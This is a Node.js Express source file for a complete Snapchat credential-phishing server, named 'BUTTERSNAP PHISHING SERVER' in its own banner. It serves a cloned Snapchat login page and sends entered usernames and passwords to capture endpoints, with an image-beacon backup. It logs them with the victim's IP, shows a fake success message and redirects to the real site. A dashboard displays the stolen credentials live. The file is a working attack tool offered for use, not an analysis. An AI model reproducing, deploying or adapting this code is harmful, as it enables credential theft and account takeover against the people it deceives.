const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIG ---
const LOG_FILE = path.join(__dirname, 'captured.log');

// --- MIDDLEWARE ---
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- SERVE STATIC FILES ---
// Serve files from 'public' folder if it exists
app.use(express.static('public'));

// --- LOGGING FUNCTION ---
function logCredentials(data) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        ...data,
        ip: data.ip || 'unknown'
    };
    
    try {
        fs.appendFileSync(LOG_FILE, JSON.stringify(logEntry) + '\n');
    } catch(e) {
        console.error('Log write error:', e);
    }
    
    console.log(`[CAPTURED] ${data.username}:${data.password}`);
}

// --- ROOT ROUTE - MAIN PAGE ---
app.get('/', (req, res) => {
    // Try to serve index.html from public folder
    const indexPath = path.join(__dirname, 'public', 'index.html');
    
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        // Fallback: Serve the HTML directly from code
        res.send(`
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Snapchat - Log In</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
                    body { background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
                    .container { background: white; padding: 40px 30px; border-radius: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
                    .logo { font-size: 60px; margin-bottom: 10px; }
                    h1 { font-size: 28px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
                    .subtitle { color: #666; font-size: 14px; margin-bottom: 30px; }
                    .input-group { margin-bottom: 16px; text-align: left; }
                    .input-group label { display: block; font-size: 14px; font-weight: 600; color: #333; margin-bottom: 5px; }
                    .input-group input { width: 100%; padding: 14px 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; transition: border 0.3s; background: #fafafa; }
                    .input-group input:focus { border-color: #fffc00; outline: none; background: white; }
                    .btn { width: 100%; padding: 16px; background: #fffc00; color: #000; border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s; margin-top: 10px; }
                    .btn:hover { background: #e6e300; transform: scale(1.02); }
                    .error { color: #d32f2f; font-size: 14px; margin-top: 12px; display: none; background: #ffebee; padding: 10px; border-radius: 8px; }
                    .success { color: #2e7d32; font-size: 14px; margin-top: 12px; display: none; background: #e8f5e9; padding: 10px; border-radius: 8px; }
                    .spinner { display: none; margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #fffc00; border-radius: 50%; animation: spin 1s linear infinite; }
                    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                    .footer { margin-top: 25px; font-size: 13px; color: #999; }
                    .captcha-badge { display: flex; align-items: center; justify-content: center; gap: 8px; margin-top: 20px; font-size: 12px; color: #888; }
                    .device-info { font-size: 12px; color: #aaa; margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="logo">👻</div>
                    <h1>Snapchat</h1>
                    <p class="subtitle">Log in to continue to Snapchat</p>
                    
                    <form id="loginForm" onsubmit="return handleSubmit(event)">
                        <div class="input-group">
                            <label for="username">Username or Email</label>
                            <input type="text" id="username" placeholder="Enter your username or email" required autofocus>
                        </div>
                        <div class="input-group">
                            <label for="password">Password</label>
                            <input type="password" id="password" placeholder="Enter your password" required>
                        </div>
                        
                        <div id="error" class="error">Invalid username or password. Please try again.</div>
                        <div id="success" class="success">✓ Verification successful! Redirecting...</div>
                        <div id="spinner" class="spinner"></div>
                        
                        <button type="submit" class="btn" id="loginBtn">Log In</button>
                    </form>
                    
                    <div class="footer">Don't have an account? <a href="#">Sign Up</a></div>
                    <div class="captcha-badge"><span>🔒</span><span>Protected by reCAPTCHA</span></div>
                    <div class="device-info" id="deviceInfo">Loading device info...</div>
                </div>

                <script>
                    function getDeviceInfo() {
                        document.getElementById('deviceInfo').textContent = 
                            'Device: ' + navigator.platform + ' | Screen: ' + window.screen.width + 'x' + window.screen.height;
                    }

                    function handleSubmit(event) {
                        event.preventDefault();
                        
                        const username = document.getElementById('username').value.trim();
                        const password = document.getElementById('password').value.trim();
                        const errorEl = document.getElementById('error');
                        const successEl = document.getElementById('success');
                        
                        if (!username || !password) {
                            errorEl.textContent = 'Please fill in all fields.';
                            errorEl.style.display = 'block';
                            successEl.style.display = 'none';
                            return false;
                        }
                        
                        errorEl.style.display = 'none';
                        successEl.style.display = 'none';
                        document.getElementById('spinner').style.display = 'block';
                        document.getElementById('loginBtn').disabled = true;
                        document.getElementById('loginBtn').textContent = 'Verifying...';
                        
                        const data = {
                            username: username,
                            password: password,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            platform: navigator.platform
                        };
                        
                        // Send to capture endpoint
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(data)
                        }).catch(() => {});
                        
                        // Send as image beacon (backup)
                        new Image().src = '/pixel?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password);
                        
                        setTimeout(function() {
                            document.getElementById('spinner').style.display = 'none';
                            successEl.textContent = '✓ Login successful! Redirecting...';
                            successEl.style.display = 'block';
                            document.getElementById('loginBtn').textContent = 'Continue';
                            
                            setTimeout(function() {
                                window.location.href = 'https://www.snapchat.com';
                            }, 2000);
                        }, 1500);
                        
                        return false;
                    }

                    window.addEventListener('DOMContentLoaded', function() {
                        getDeviceInfo();
                        document.getElementById('username').focus();
                    });
                </script>
            </body>
            </html>
        `);
    }
});

// --- CAPTURE ENDPOINTS ---
app.post('/capture', (req, res) => {
    const data = req.body;
    data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logCredentials(data);
    res.status(200).json({ status: 'ok', message: 'Captured' });
});

app.post('/api/login', (req, res) => {
    const data = req.body;
    data.ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    logCredentials(data);
    res.status(200).json({ status: 'ok' });
});

app.get('/pixel', (req, res) => {
    const data = {
        username: req.query.u || 'unknown',
        password: req.query.p || 'unknown',
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        timestamp: new Date().toISOString()
    };
    logCredentials(data);
    res.writeHead(200, {
        'Content-Type': 'image/gif',
        'Cache-Control': 'no-cache'
    });
    res.end(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
});

// --- VIEW LOGS ---
app.get('/logs', (req, res) => {
    const auth = req.headers.authorization;
    if (auth !== 'Bearer YOUR_SECRET_TOKEN_HERE') {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    try {
        const logs = fs.readFileSync(LOG_FILE, 'utf8');
        const lines = logs.split('\n').filter(Boolean).map(line => JSON.parse(line));
        res.json({ count: lines.length, logs: lines });
    } catch(e) {
        res.json({ count: 0, logs: [] });
    }
});

// --- DASHBOARD ---
app.get('/dashboard', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Capture Dashboard</title>
            <style>
                body { font-family: Arial; padding: 20px; background: #f5f5f5; }
                .log { border: 1px solid #ddd; padding: 10px; margin: 5px; background: white; border-radius: 5px; }
                .log b { color: #fffc00; }
                .time { color: #999; font-size: 12px; }
                .count { font-size: 24px; color: #333; }
            </style>
        </head>
        <body>
            <h1>🔓 Snapchat Credential Capture</h1>
            <h2 class="count" id="count">Total Captures: 0</h2>
            <div id="logs"></div>
            <script>
                function fetchLogs() {
                    fetch('/logs', { headers: { 'Authorization': 'Bearer YOUR_SECRET_TOKEN_HERE' } })
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('count').textContent = 'Total Captures: ' + data.count;
                        document.getElementById('logs').innerHTML = 
                            data.logs.slice(-30).reverse().map(l => 
                                '<div class="log"><b>' + l.username + '</b> : ' + l.password + 
                                ' <span class="time">' + l.timestamp + '</span></div>'
                            ).join('');
                    })
                    .catch(() => {});
                }
                fetchLogs();
                setInterval(fetchLogs, 3000);
            </script>
        </body>
        </html>
    `);
});

// --- 404 HANDLER ---
app.use((req, res) => {
    res.status(404).send(`
        <!DOCTYPE html>
        <html>
        <head><title>Snapchat</title></head>
        <body style="font-family:Arial;text-align:center;padding:50px;">
            <h1>👻</h1>
            <h2>Page not found</h2>
            <p>Return to <a href="/">Snapchat</a></p>
        </body>
        </html>
    `);
});

// --- START SERVER ---
app.listen(PORT, '0.0.0.0', () => {
    console.log('='.repeat(60));
    console.log('[CAT] 🐱 BUTTERSNAP PHISHING SERVER');
    console.log('[CAT] ✅ Server running on port:', PORT);
    console.log('[CAT] 📍 Main page: http://0.0.0.0:' + PORT);
    console.log('[CAT] 📊 Dashboard: http://0.0.0.0:' + PORT + '/dashboard');
    console.log('[CAT] 📥 Capture endpoint: http://0.0.0.0:' + PORT + '/capture');
    console.log('[CAT] 📁 Log file:', LOG_FILE);
    console.log('='.repeat(60));
    console.log('[CAT] 🎯 Waiting for victims...');
});